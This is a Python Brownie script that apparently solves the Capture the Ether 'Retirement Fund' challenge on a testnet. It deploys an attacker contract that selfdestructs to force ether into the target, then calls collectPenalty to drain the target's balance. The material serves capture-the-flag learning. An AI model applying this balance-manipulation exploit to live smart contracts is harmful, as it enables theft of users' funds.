from brownie import accounts, RetirementFundChallenge, RetirementFundAttacker
from web3 import Web3

eth_amount = Web3.toWei("0.001", "ether")
challenge_address = "0x56aEb5A5E321a5e46BB640e15d06Bd75bBF479c4"

# ---------------------------------------------------------------------
# to beat this challenge we need to reduce this contract's balance to 0
# we can do this by utilizing the special selfdestruct function
# to manipulate the balance of the challenge contract
# ---------------------------------------------------------------------


def test_retirement_fund():
    # load account
    account = accounts.load("Ropsten_test_net_account")

    # get challenge contract
    challenge = RetirementFundChallenge.at(challenge_address)

    print(f"Balance of challenge contract: {challenge.balance()}")

    # deploy hacker contract
    hacker = RetirementFundAttacker.deploy({"from": account, "value": eth_amount})

    # call destroy in hacker contract
    tx = hacker.destroy(challenge_address, {"from": account})
    tx.wait(1)

    print(f"Balance of challenge contract: {challenge.balance()}")

    # call collectPenalty and drain challenge contract
    tx = challenge.collectPenalty({"from": account})
    tx.wait(1)

    # confirm that the level is completed
    assert challenge.isComplete()
